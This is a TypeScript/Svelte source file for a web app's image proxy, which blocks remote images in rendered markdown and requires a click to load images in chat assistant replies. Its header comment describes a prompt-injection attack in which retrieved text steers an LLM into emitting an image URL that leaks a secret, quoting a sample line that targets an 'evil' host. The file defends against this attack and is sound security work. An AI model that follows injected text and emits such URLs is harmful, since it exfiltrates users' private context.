// Camo post-render pass (design 07-camo §4.3, D2b) as Svelte actions, shared by
// EVERY renderMarkdown sink (Markdown.svelte for issues/comments, MessageBubble
// for chat streaming) so the "one markdown path" invariant (design 04 §9.6)
// extends to image proxying: one place mints proxy <img>, not one per surface.
//
// The renderer leaves foreign remote images as span.md-img-blocked[data-camo-src]
// placeholders (markdown.ts). Two actions turn them into proxied same-origin
// <img src="/api/img/…"> (allowed by img-src 'self' — the CSP never changes):
//
//  - camoProxy (issue/comment markdown): collects the placeholders after each
//    render, batch-signs their URLs via POST /api/img/sign (origin "issue") and
//    swaps each signed one. Foreign text, but no model in the loop.
//  - camoClickToLoad (chat assistant turns): signs NOTHING on render. LLM output
//    can be steered by injected text in a retrieved block into an image URL that
//    carries context (`![](https://evil/?d=<secret>)`); a sign on render would
//    make the server fetch it without anyone looking (GHSA 2026-10-31 §7). Each
//    placeholder instead shows the target host + a shortened path and a "Load
//    image" button; one click signs exactly that one URL (origin "assistant").
//    Approved URLs are remembered for the page session, so the re-renders of a
//    streaming or re-mounted message swap them again without another click.
//
// Fail-safe by construction: the placeholder is the default and the fallback. A
// disabled proxy, a sign failure, or a URL the server declines all leave the
// visible placeholder in place — the swap is purely additive. A per-run token
// discards a stale async response so a fast re-render never swaps against a
// superseded document.

import { signImages } from '../api/images'

const PLACEHOLDER = 'span.md-img-blocked[data-camo-src]'

// Mirror of the server's mint rule (camo.ProxiableURL): the server is the
// authority, this only decides whether a "Load image" button is worth offering.
const MAX_PATH_LEN = 512
const SHOWN_PATH_LEN = 48

/** Viewer-approved assistant images of this page session: url → proxy path. */
const approved = new Map<string, string>()
/** Assistant image URLs whose click-sign is in flight. */
const pending = new Set<string>()

function swapToImg(ph: HTMLElement, proxied: string): void {
  const img = ph.ownerDocument.createElement('img')
  img.className = 'md-img'
  img.setAttribute('src', proxied) // server-minted, same-origin
  img.setAttribute('loading', 'lazy')
  img.setAttribute('decoding', 'async')
  const alt = ph.getAttribute('data-camo-alt')
  if (alt) img.setAttribute('alt', alt)
  ph.replaceWith(img)
}

function placeholdersIn(node: HTMLElement): HTMLElement[] {
  return Array.from(node.querySelectorAll<HTMLElement>(PLACEHOLDER))
}

export function camoProxy(node: HTMLElement, _content?: unknown) {
  let token = 0

  function run() {
    const placeholders = placeholdersIn(node)
    if (placeholders.length === 0) return
    const current = ++token
    const urls = placeholders.map((p) => p.getAttribute('data-camo-src') ?? '')
    void signImages(urls, 'issue').then((sigs) => {
      if (current !== token) return // superseded by a newer render
      if (!node.isConnected) return
      for (const ph of placeholders) {
        if (!ph.isConnected) continue
        const proxied = sigs[ph.getAttribute('data-camo-src') ?? '']
        if (!proxied) continue // declined / proxy off → keep the placeholder
        swapToImg(ph, proxied)
      }
    })
  }

  run()
  return {
    // Re-run after the {@html} content changes (the bound param is the html).
    update() {
      run()
    },
  }
}

/**
 * The parts of a foreign image URL the placeholder may show, or null when it is
 * not http(s). `loadable` mirrors the server rule: no query string, no
 * userinfo, a bounded path. The query string is never part of the label.
 */
export function describeImageURL(raw: string): { label: string; loadable: boolean } | null {
  let u: URL
  try {
    u = new URL(raw)
  } catch {
    return null
  }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') return null
  const path = u.pathname
  const shown =
    path.length > SHOWN_PATH_LEN ? `${path.slice(0, SHOWN_PATH_LEN - 21)}…${path.slice(-20)}` : path
  const hasQuery = raw.split('#', 1)[0].includes('?')
  const loadable = !hasQuery && u.username === '' && u.password === '' && path.length <= MAX_PATH_LEN
  return { label: `${u.host}${shown}`, loadable }
}

function proxyExpired(proxied: string): boolean {
  const exp = Number(new URLSearchParams(proxied.split('?')[1] ?? '').get('exp'))
  return !Number.isFinite(exp) || exp * 1000 <= Date.now()
}

/** Approved proxy path for url, dropping it once its signature has expired. */
function approvedPath(url: string): string | undefined {
  const p = approved.get(url)
  if (p && proxyExpired(p)) {
    approved.delete(url) // a lapsed approval needs a fresh click
    return undefined
  }
  return p
}

function setButton(btn: HTMLButtonElement, url: string): void {
  const busy = pending.has(url)
  btn.disabled = busy
  btn.textContent = busy ? 'Loading…' : 'Load image'
}

function decorate(ph: HTMLElement): void {
  if (ph.hasAttribute('data-camo-click')) return
  ph.setAttribute('data-camo-click', '')
  const doc = ph.ownerDocument
  const url = ph.getAttribute('data-camo-src') ?? ''
  const info = describeImageURL(url)
  const label = doc.createElement('span')
  label.className = 'md-img-label'
  if (!info) {
    label.textContent = '[external image blocked]'
    ph.replaceChildren(label)
    return
  }
  if (!info.loadable) {
    label.textContent = `[external image blocked] ${info.label} (not loadable: query string, credentials or long path)`
    ph.replaceChildren(label)
    return
  }
  label.textContent = `[external image] ${info.label}`
  const btn = doc.createElement('button')
  btn.type = 'button'
  btn.className = 'md-img-load'
  btn.setAttribute('aria-label', `Load image from ${info.label}`)
  setButton(btn, url)
  ph.replaceChildren(label, ' ', btn)
}

export function camoClickToLoad(node: HTMLElement, _content?: unknown) {
  // Swap every placeholder whose URL the viewer already approved, decorate the
  // rest. Pure DOM — this never talks to the server.
  function run() {
    for (const ph of placeholdersIn(node)) {
      const proxied = approvedPath(ph.getAttribute('data-camo-src') ?? '')
      if (proxied) swapToImg(ph, proxied)
      else decorate(ph)
    }
  }

  function onClick(ev: MouseEvent) {
    const target = ev.target instanceof Element ? ev.target : null
    const btn = target?.closest<HTMLButtonElement>('button.md-img-load')
    if (!btn || !node.contains(btn)) return
    const ph = btn.closest<HTMLElement>(PLACEHOLDER)
    const url = ph?.getAttribute('data-camo-src') ?? ''
    if (!url || pending.has(url)) return
    ev.preventDefault()
    pending.add(url)
    setButton(btn, url)
    void signImages([url], 'assistant').then((sigs) => {
      pending.delete(url)
      const proxied = sigs[url]
      if (proxied) approved.set(url, proxied)
      if (!node.isConnected) return
      if (proxied) {
        run() // swaps this URL in whatever the current render holds
        return
      }
      // Declined, proxy off or rate-limited: keep the placeholder, allow a retry.
      for (const b of node.querySelectorAll<HTMLButtonElement>('button.md-img-load')) {
        if (b.closest(PLACEHOLDER)?.getAttribute('data-camo-src') !== url) continue
        b.disabled = false
        b.textContent = 'Not available — retry'
      }
    })
  }

  node.addEventListener('click', onClick)
  run()
  return {
    // Re-run after the {@html} content changes (the bound param is the html).
    update() {
      run()
    },
    destroy() {
      node.removeEventListener('click', onClick)
    },
  }
}
